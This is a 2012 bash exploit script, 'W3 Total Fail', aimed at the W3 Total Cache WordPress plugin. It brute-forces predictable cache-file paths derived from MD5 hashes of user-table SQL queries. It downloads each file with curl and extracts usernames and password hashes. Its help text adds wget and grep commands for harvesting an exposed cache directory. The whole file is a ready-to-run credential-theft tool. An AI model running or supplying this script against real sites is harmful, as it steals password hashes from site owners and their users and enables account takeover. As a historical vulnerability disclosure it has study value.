#!/bin/bash
# (C) Copyright 2012 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
#
# |---------------|
# | W3 Total Fail |
# |    by zx2c4   |
# |---------------|
#
# For more info, see built-in help text.
# Most up to date version is available at: http://git.zx2c4.com/w3-total-fail/tree/w3-total-fail.sh
#
# This affects all current versions of W3 Total Cache up to and including the latest version, 0.9.2.4.

set -f


printf "\033[1m\033[31m"
echo "<===== W3 Total Fail =====>"
echo "<                         >"
echo "<        by zx2c4         >"
echo "<                         >"
echo "<=========================>"
echo
echo
printf "\033[0m\033[1m"
echo "W3 Total Fail works by attempting to guess SQL queries that might"
echo "contain important password hashes. It walks through"
printf "\033[0m"
echo "     http://\$wordpress/wp-content/w3tc/dbcache/..."
printf "\033[1m"
echo "until it's found the right files. If this directory has directory"
echo "index listings turned on, you might have more luck downloading the"
echo "entire folder and grepping locally for patterns, like so:"
printf "\033[0m"
echo "    \$ wget -np -r http://\$wordpress/wp-content/w3tc/dbcache/"
echo "    \$ grep -Ra user_pass ."
printf "\033[1m"
echo "If directory listings are not available, then this is the tool for"
echo "you, as it will try to brute force possible w3tc keys. It will try"
echo "25 user ids and 25 site ids. Adjust the script for more or less range."
echo
echo "Enjoy!"
echo
echo "- zx2c4"
echo "Dec 24, 2012"
echo
printf "\033[0m"

printf "\033[0m\033[36m"
echo "Usage: $0 HOST [URLBASE] [DBPREFIX]"
echo
echo "HOST should be the name of the host that is stored by wordpress. It"
echo "may be the actual host name of the server, or it might be something"
echo "different, depending on how wordpress is configured."
echo "Example: blog.zx2c4.com"
echo
echo "URLBASE is the base URL of the wordpress blog which are prefixed in"
echo "forming HTTP requests. If not specified it will default to http://\$HOST"
echo "Example: http://blog.zx2c4.com or https://someblahblasite.com/my_blog"
echo
echo "DBPREFIX is the wordpress prefix used for database table names. It"
echo "is often \"wp_\", which DBPREFIX defaults to if this argument is"
echo "unspecified. Some wordpress installations will use an empty prefix,"
echo "and others use a site-specific prefix. Most, however, will use the"
echo "default."
echo "Example: wp_"
echo
printf "\033[0m"

if [ $# -lt 1 ]; then
	echo "Error: HOST is a required argument."
	exit 1
fi

host="$1"
urlbase="${2:-http://$host}"
db_prefix="$3"
[ $# -lt 3 ] && db_prefix="wp_"

for site_id in {1..25} 0; do for user_id in {1..25}; do
	query="SELECT * FROM ${db_prefix}users WHERE ID = '$user_id'"
	key="w3tc_${host}_${site_id}_sql_$(echo -n "$query"|md5sum|cut -d ' ' -f 1)"
	hash="$(echo -n "$key"|md5sum|cut -d ' ' -f 1)"
	hash_path="${hash:0:1}/${hash:1:1}/${hash:2:1}/${hash}"
	url="$urlbase/wp-content/w3tc/dbcache/$hash_path"

	printf "\033[33m"
	echo -n "Attempting"
	printf "\033[0m"
	echo " $url..."
	curl -s "$url" | tail -c +5 | tr -d '\n' | sed -n 's/.*"user_login";s:[0-9]\+:"\([^"]*\)";s:[0-9]\+:"user_pass";s:[0-9]\+:"\([^"]*\)".*/\x1b[1m\x1b[32mUsername: \1\nPassword hash: \2\x1b[0m\n/p'

done; done
